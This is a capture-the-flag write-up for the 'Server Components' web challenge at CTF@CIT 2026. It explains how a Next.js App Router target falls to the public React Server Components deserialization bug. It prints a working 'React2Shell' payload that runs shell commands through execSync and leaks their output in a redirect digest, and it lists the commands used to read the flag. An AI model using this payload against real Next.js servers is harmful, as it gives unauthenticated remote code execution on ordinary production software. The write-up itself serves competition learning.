---
title: "Server Components - CTF@CIT 2026"
category: "web"
subcategory: "deserialization"
type: "writeup"
tags: ["web", "deserialization", "base64", "nextjs", "server", "components", "ctf-cit", "ctf-cit-2026", "2026", "ctf-writeup"]
summary: "The target is a Next.js App Router site."
source:
  name: "CTFtime writeup #40753"
  url: "https://ctftime.org/writeup/40753"
ctf:
  name: "CTF@CIT 2026"
  year: 2026
  challenge: "Server Components"
---

## Metadata

- **CTF:** CTF@CIT 2026
- **Task:** Server Components
- **Author team:** Byte0xb105
- **CTFtime:** <https://ctftime.org/writeup/40753>

---
# Writeup: Server Components

## Flag

`CIT{R3aCt_1s_Vu1n3r@bl3}`

## Solve

The target is a Next.js App Router site.

`POST /` with an arbitrary `Next-Action` header and multipart Flight payload returns `500` with `text/x-component`, which matches the public React/Next RSC deserialization bug (`CVE-2025-55182` / `CVE-2025-66478`).

Using the redirect-based `React2Shell` payload gives unauthenticated RCE:

```text  
var o=Buffer.from(process.mainModule.require('child_process').execSync(CMD)).toString('base64');  
var e=new Error();  
e.digest='NEXT_REDIRECT;push;http://x/'+o+';307;';  
throw e;  
```

That let me run commands like `pwd`, `ls -la /app`, `cat /app/flag.txt`, and `find /app -type f | sort`.

Important caveat: the live instance is mutable and already polluted. `flag.txt` had been overwritten with `Request logged successfully.`, and multiple junk files like `flag=...`, `app`, and `index.html` had the same content. The only intact flag-shaped value still present on disk was the filename `flag=CIT{R3aCt_1s_Vu1n3r@bl3}`.

Because of that pollution, the candidate flag was recovered from the live filesystem artifact, not from pristine `flag.txt`.

## Notes

\- Public surface and RSC captures are saved under `other/fetched/http/`.  
\- The reusable exploit/fetcher is `scripts/[solve.py](http://solve.py)`.  
\- A thin wrapper for live artifact capture is `scripts/[fetch-live-artifacts.sh](http://fetch-live-artifacts.sh)`.  
\- The target timed out while I was attempting a full chunked mirror of `/app`, so the stored artifacts are partial plus the recovered remote file inventory.
